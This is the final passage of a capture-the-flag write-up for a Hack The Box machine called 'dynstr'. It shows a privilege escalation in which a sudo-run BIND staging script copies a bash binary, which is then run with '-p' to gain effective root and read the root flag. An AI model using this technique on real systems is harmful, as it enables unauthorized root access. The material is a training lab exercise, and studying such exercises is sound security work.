Now everything is set, let’s execute the script.

```
bindmgr@dynstr:~/test$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr/test.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
    /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
    /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
    /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
```

After executing the script it check for version file and copy everything to staging directory. The error is insignificance, because the copying has been successfully done. If error occurs before staging then we need to look into that error.

Now we can access the bash binary from /etc/bind/named.bindmgr/ directory and read root flag.

```other
bindmgr@dynstr:~/test$ /etc/bind/named.bindmgr/bash -p

bash-5.0# id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr)

bash-5.0# cat /root/root.txt
1df144c619dd82a95583d062b2ca7682
```

# References

[http://manpages.ubuntu.com/manpages/cosmic/man1/nsupdate.1.html](http://manpages.ubuntu.com/manpages/cosmic/man1/nsupdate.1.html)

[Dynamic DNS Update API | Dyn Help Center](https://help.dyn.com/remote-access-api/)
